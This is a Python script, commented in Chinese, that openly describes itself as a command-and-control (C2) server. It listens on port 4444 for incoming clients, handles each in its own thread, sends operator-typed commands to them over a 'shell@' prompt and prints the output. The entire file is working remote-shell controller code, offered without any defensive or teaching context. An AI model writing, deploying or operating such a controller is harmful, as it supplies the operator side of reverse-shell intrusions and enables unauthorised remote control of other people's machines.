#!/usr/bin/env python3
# ============================================================
#  C2 服务端
#  开端口等客户端连入,每个客户端一个线程,
#  在终端读命令 -> 发给客户端 -> 打印回包。
# ============================================================
import socket
import sys
import threading

HOST = "0.0.0.0"
PORT = 4444
BUFSIZE = 4096

clients = []           # (sock, addr)
clients_lock = threading.Lock()

def handle(sock: socket.socket, addr) -> None:
    print(f"[+] {addr} connected")
    # 先读客户端上线提示
    try:
        banner = sock.recv(BUFSIZE)
        if banner:
            print(banner.decode(errors="replace"), end="")
    except Exception:
        pass

    with clients_lock:
        clients.append((sock, addr))

    try:
        while True:
            try:
                cmd = input(f"shell@{addr[0]}:{addr[1]}> ")
            except EOFError:
                cmd = "exit"
            cmd = cmd.strip()
            if not cmd:
                continue
            if cmd in ("exit", "quit"):
                sock.sendall(b"exit\n")
                break
            sock.sendall((cmd + "\n").encode())
            try:
                resp = sock.recv(BUFSIZE)
                if not resp:
                    print("[!] client closed")
                    break
                sys.stdout.write(resp.decode(errors="replace"))
                sys.stdout.flush()
            except socket.timeout:
                print("[!] recv timeout")
    except Exception as e:
        print(f"[-] {addr} error: {e}")
    finally:
        with clients_lock:
            try:
                clients.remove((sock, addr))
            except ValueError:
                pass
        sock.close()
        print(f"[-] {addr} disconnected")

def main() -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] C2 listening on {HOST}:{PORT}")

    try:
        while True:
            sock, addr = s.accept()
            t = threading.Thread(target=handle, args=(sock, addr), daemon=True)
            t.start()
    except KeyboardInterrupt:
        print("\n[!] shutting down")
    finally:
        s.close()

if __name__ == "__main__":
    main()
